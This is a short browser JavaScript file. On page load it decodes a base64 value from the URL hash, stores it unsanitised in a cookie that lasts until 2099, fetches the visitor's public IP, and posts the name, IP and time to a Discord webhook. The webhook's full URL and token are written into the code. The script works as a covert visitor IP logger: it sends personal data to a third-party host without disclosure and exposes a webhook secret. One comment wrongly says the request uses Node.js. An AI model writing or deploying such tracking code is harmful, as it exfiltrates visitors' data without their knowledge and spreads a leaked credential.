window.addEventListener('DOMContentLoaded', () => {
    const encodedData = window.location.hash.substr(1); // Extract the encoded data from the URL hash
    const decodedData = atob(encodedData); // Decode the Base64 data

const cookieName = 'B64_User';
const existingCookie = document.cookie.split(';').find(cookie => cookie.trim().startsWith(`${cookieName}=`));

if (existingCookie) {
    // Update the existing cookie value
    const cookieValue = existingCookie.split('=')[1].trim();

    if (cookieValue !== decodedData) {
        // Create a new cookie with the updated value
        document.cookie = `${cookieName}=${decodedData}; expires=Thu, 01 Jan 2099 00:00:00 UTC; path=/; SameSite=None; Secure`;
    }
} else {
    // Create a new cookie if it doesn't exist
    document.cookie = `${cookieName}=${decodedData}; expires=Thu, 01 Jan 2099 00:00:00 UTC; path=/; SameSite=None; Secure`;
}


    // Fetch the user's IP address
    fetch('https://api.ipify.org/?format=json')
        .then(response => response.json())
        .then(data => {
            const ipAddress = data.ip; // Extract the IP address from the response

            const time = new Date().toLocaleString(); // Get the current time

            const content = `${decodedData} has logged in from ${ipAddress} at ${time}`;

            // Send the content to the Discord webhook using Node.js
            const webhookURL = 'https://discord.com/api/webhooks/1108243971903328266/E2blu9qecMYFAewGaMBlKYvrwPxaVzpBNLaPqhb4jJS1ji6flbs3TACs-grTV9KMZx64';
            const payload = JSON.stringify({ content });

            const xhr = new XMLHttpRequest();
            xhr.open('POST', webhookURL, true);
            xhr.setRequestHeader('Content-type', 'application/json');
            xhr.send(payload);
        })
        .catch(error => console.error('Error:', error));
});
